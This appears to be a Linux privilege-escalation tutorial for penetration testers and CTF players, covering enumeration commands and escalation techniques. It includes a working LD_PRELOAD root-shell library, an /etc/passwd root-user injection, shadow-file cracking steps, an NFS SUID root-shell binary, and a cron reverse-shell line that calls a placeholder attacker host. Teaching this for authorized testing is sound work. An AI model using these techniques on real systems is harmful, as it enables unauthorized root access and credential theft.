# Privilege Escalation
At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.


**Why is it important?**  
It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:
* Resetting passwords
* Bypassing access controls to compromise protected data
* Editing software configurations
* Enabling persistence
* Changing the privilege of existing (or new) users
* Execute any administrative command

# Table of Contents
1. [Enumeration](#enumeration)
   1. [hostname](#hostname)
   2. [uname -a](#uname--a)
   3. [/proc/version](#procversion)
   4. [/etc/issue](#etcissue)
   5. [ps Command](#ps-command)
   6. [env](#env)
   7. [sudo -l](#sudo--l)
   8. [ls -la](#ls--la)
   9. [Id](#id)
   10. [/etc/passwd](#etcpasswd)
   11. [history](#history)
   12. [ifconfig](#ifconfig)
   13. [netstat](#netstat)
   14. [find Command](#find-command)
2. [Automated Enumeration Tools](#automated-enumeration-tools)
3. [Privilege Escalation Techniques](#privilege-escalation-techniques)
   1. [Kernel Exploits](#kernel-exploits)
   2. [Sudo](#sudo)
   3. [SUID](#suid)
   4. [Capabilities](#capabilities)
   5. [Cron-jobs](#cron-jobs)
   6. [PATH Variable](#path-variable)
   7. [NFS](#nfs)

# Enumeration
Enumeration is the process of gathering information about the target system. This information can be used to identify potential vulnerabilities and to determine the best way to exploit them. The following are some of the most common enumeration techniques used in Linux environments.


## hostname
The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

## uname -a
Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

## /proc/version
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

## /etc/issue
Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

## ps Command
The `ps` command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.

The output of the `ps` (Process Status) will show the following;
* **PID**: The process ID (unique to the process)
* **TTY**: Terminal type used by the user
* **Time**: Amount of CPU time used by the process (this is NOT the time this process has been running for)
* **CMD**: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.
* `ps -A`: View all running processes
* `ps axjf`: View process tree 
* `ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

![PS](../../../../../../Images/Privilege-escalation/ps.png)

## env
The `env` command will show environmental variables.
The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

![ENV](../../../../../../Images/Privilege-escalation/env.png)

## sudo -l
The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.

## ls -la
One of the common commands used in Linux is probably `ls`.

While looking for potential privilege escalation vectors, please remember to always use the `ls` command with the `-la` parameter. A “secret.txt” file can easily be missed using the `ls` or` ls -l` commands.

![ls](../../../../../../Images/Privilege-escalation/ls.png)


## Id
The `id` command will provide a general overview of the user’s privilege level and group memberships.

It is worth remembering that the `id` command can also be used to obtain the same information for another user as seen below.

![ID](../../../../../../Images/Privilege-escalation/id.png)


## /etc/passwd
Reading the `/etc/passwd` file can be an easy way to discover users on the system.

![Passwd1](../../../../../../Images/Privilege-escalation/passwd1.png)

While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.

![Passwd2](../../../../../../Images/Privilege-escalation/passwd2.png)

Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.

![Passwd3](../../../../../../Images/Privilege-escalation/passwd3.png)

## history
Looking at earlier commands with the `history` command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

## ifconfig
The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.

![ifconfig](../../../../../../Images/Privilege-escalation/ifconfig.png)

This can be confirmed using the ip route command to see which network routes exist.

![ip route](../../../../../../Images/Privilege-escalation/route.png)

## netstat
Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.


* `netstat -a`: shows all listening ports and established connections.
* `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
* `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
* `netstat -s`: list network usage statistics by protocol. This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.
* `netstat -tp`: list connections with the service name and PID information.
  * This can also be used with the `-l` option to list listening ports (below)
* `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

The netstat usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;
* `-a`: Display all sockets
* `-n`: Do not resolve names
* `-o`: Display timers

## find Command
Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “`find`” command is useful and worth keeping in your arsenal.

Below are some useful examples for the “find” command.
Find files:

* `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
* `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
* `find / -type d -name config`: find the directory named config under “/”
* `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
* `find / -perm a=x`: find executable files
* `find /home -user frank`: find all files for user “frank” under “/home”
* `find / -mtime 10`: find files that were modified in the last 10 days
* `find / -atime 10`: find files that were accessed in the last 10 day
* `find / -cmin -60`: find files changed within the last hour (60 minutes)
* `find / -amin -60`: find files accesses within the last hour (60 minutes)
* `find / -size 50M`: find files with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “`-type f 2>/dev/null`” to redirect errors to “`/dev/null`” and have a cleaner output.

Folders and files that can be written to or executed from:

* `find / -writable -type d 2>/dev/null`: Find world-writeable folders
* `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
* `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
* `find / -perm -o x -type d 2>/dev/null`: Find world-executable folders

Find development tools and supported languages:
* `find / -name perl*`
* `find / -name python*`
* `find / -name gcc*`

Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it.

* `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a 
higher privilege level than the current user.

# Automated Enumeration Tools
The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

* LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
* LinEnum: https://github.com/rebootuser/LinEnum
* LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
* Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
* Linux Priv Checker: https://github.com/linted/linuxprivchecker

# Privilege Escalation Techniques
Different privilege escalation techniques can be used depending on the target system. The following is a list of techniques that can be used to escalate privileges on a Linux system.

## Kernel Exploits
Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.


Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.


The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.


The Kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

**Research sources:**  
Based on your findings, you can use Google to search for an existing exploit code.
Sources such as https://www.linuxkernelcves.com/cves can also be useful.
Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

**Hints/Notes:**
1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
4. You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.

## Sudo
The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the` sudo -l` command.

https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

### Leverage application functions
Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

### Leverage LD_PRELOAD
On some systems, you may see the LD_PRELOAD environment option.

LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;
1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

```c++
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as `shell.c` and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.


## SUID
Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an “s” bit set showing their special permission level.

`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.

![SUID](/Images/Privilege-escalation/suid.png)

A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list https://gtfobins.github.io/#+suid).

The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.

Below are simple steps using both vectors.

reading the `/etc/shadow` file

We see that the nano text editor has the SUID bit set by running the find / -type f -perm -04000 -ls 2>/dev/null command.

nano `/etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.

The unshadow tool’s usage can be seen below;  
`unshadow passwd.txt shadow.txt > passwords.txt`

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. 

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

```bash
openssl passwd -1 -salt <salt> <password>
```

We will then add this password with a username to the `/etc/passwd` file.

![Suid Hack](/Images/Privilege-escalation/suid_hack.png)

Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.

![Switch user](/Images/Privilege-escalation/switch_user.png)

## Capabilities
Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

We can use the `getcap -r / 2>/dev/null` tool to list enabled capabilities.

Please note that some instanced doesnt have the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

## Cron Jobs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under `/etc/crontab`

If we can change the file, a reverse shell can be implemented to gain a root shell.

Example of a reverse shell in a cron job:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<IP_HERE>/<PORT_HERE> 0>&1
```

You can also use the `crontab -l` command to list the current user’s crontab.

Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level
1. System administrators need to run a script at regular intervals.
2. They create a cron job to do this
3. After a while, the script becomes useless, and they delete it
4. They do not clean the relevant cron job

This change management issue leads to a potential exploit leveraging cron jobs.

## PATH Variable
If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).

The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “export PATH=/tmp:$PATH” command accomplishes this.

Creating an executable is fairly easy by copying /bin/bash as “hack” under the /tmp folder.

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.

## NFS
Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.

NFS (Network File Sharing) configuration is kept in the `/etc/exports` file. This file is created during the NFS server installation and can usually be read by users.

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.  
`showmount -e <IP>`

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.

```bash
$ mkdir /tmp/bckp-attacker
$ mount -t nfs <IP>:/tmp/bckp /tmp/bckp-attacker
```

As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.

```c++
int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

Once we compile the code we will set the SUID bit.

```bash
$ gcc nfs.c -o nfs -w
$ chmod +s nfs
$ ls -l nfs
$ ./nfs
```
